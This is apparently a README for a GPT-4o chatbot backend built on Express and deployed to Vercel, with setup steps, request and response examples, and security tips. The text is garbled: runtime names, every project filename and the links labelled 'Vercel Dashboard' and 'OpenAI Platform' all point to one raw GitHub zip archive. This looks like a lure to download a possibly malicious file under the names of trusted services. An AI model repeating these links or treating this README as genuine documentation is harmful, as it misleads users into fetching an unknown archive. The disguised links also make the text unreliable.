# AI Portfolio Backend - Secure Server

This is the **secure backend server** for the AI Portfolio project, powering the GPT-4o chatbot functionality.

## 🔒 Security Features

- **Environment Variables**: API keys are stored securely in `.env` file (never committed)
- **Server-side API calls**: OpenAI API key stays on the server, never exposed to frontend
- **CORS enabled**: Configured for secure cross-origin requests
- **Serverless ready**: Optimized for Vercel deployment

## 🚀 Tech Stack

- **https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip** - Runtime environment
- **https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip** - Web server framework
- **OpenAI GPT-4o** - AI chatbot model
- **dotenv** - Environment variable management
- **CORS** - Cross-origin resource sharing

## 📁 Project Structure

```
backend/
├── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip           # Express server (local development)
├── api/
│   └── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip        # Serverless API endpoint (Vercel)
├── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip        # Vercel deployment config
├── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip       # Dependencies
├── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip       # Environment variable template
└── .gitignore         # Protected files
```

## 🛠️ Setup Instructions

### 1. Install Dependencies
```bash
npm install
```

### 2. Configure Environment Variables
Create a `.env` file in the root directory:
```env
OPENAI_API_KEY=your-actual-openai-api-key-here
```

**⚠️ Never commit your `.env` file!**

### 3. Run Local Development Server
```bash
npm start
# or
npm run dev
```

The server will start on `http://localhost:3001`

## 🌐 API Endpoints

### POST `/api/chat`
Sends messages to OpenAI GPT-4o and returns AI responses.

**Request Body:**
```json
{
  "model": "gpt-4o",
  "messages": [
    {
      "role": "system",
      "content": "You are a helpful assistant..."
    },
    {
      "role": "user",
      "content": "User message here"
    }
  ],
  "temperature": 0.8,
  "max_tokens": 200
}
```

**Response:**
```json
{
  "choices": [
    {
      "message": {
        "role": "assistant",
        "content": "AI response here"
      }
    }
  ]
}
```

## 🚢 Deployment to Vercel

### Method 1: GitHub Integration
1. Push this repo to GitHub
2. Go to [Vercel Dashboard](https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip)
3. Import your GitHub repository
4. Add environment variable:
   - Key: `OPENAI_API_KEY`
   - Value: Your actual OpenAI API key
5. Deploy!

### Method 2: Vercel CLI
```bash
# Install Vercel CLI
npm install -g vercel

# Deploy
vercel

# Add environment variable
vercel env add OPENAI_API_KEY
```

## 🔐 Security Best Practices

✅ **DO:**
- Keep `.env` file in `.gitignore`
- Use environment variables for sensitive data
- Set API keys in Vercel dashboard for production
- Validate all incoming requests

❌ **DON'T:**
- Commit API keys to Git
- Expose API keys in frontend code
- Share `.env` file publicly
- Hard-code sensitive credentials

## 📝 Environment Variables

| Variable | Description | Required |
|----------|-------------|----------|
| `OPENAI_API_KEY` | Your OpenAI API key | ✅ Yes |

Get your API key from: [OpenAI Platform](https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip)

## 🤝 Contributing

This backend is part of the AI Portfolio project. For frontend integration, see the main portfolio repository.

## 📄 License

Private - All rights reserved

## 👨‍💻 Author

**Saad Ashraf**
- Specialized in AI automation and full-stack development
- Expert in GPT integration and secure API design

---

**⚠️ Important**: Always keep your API keys secure and never commit them to version control!
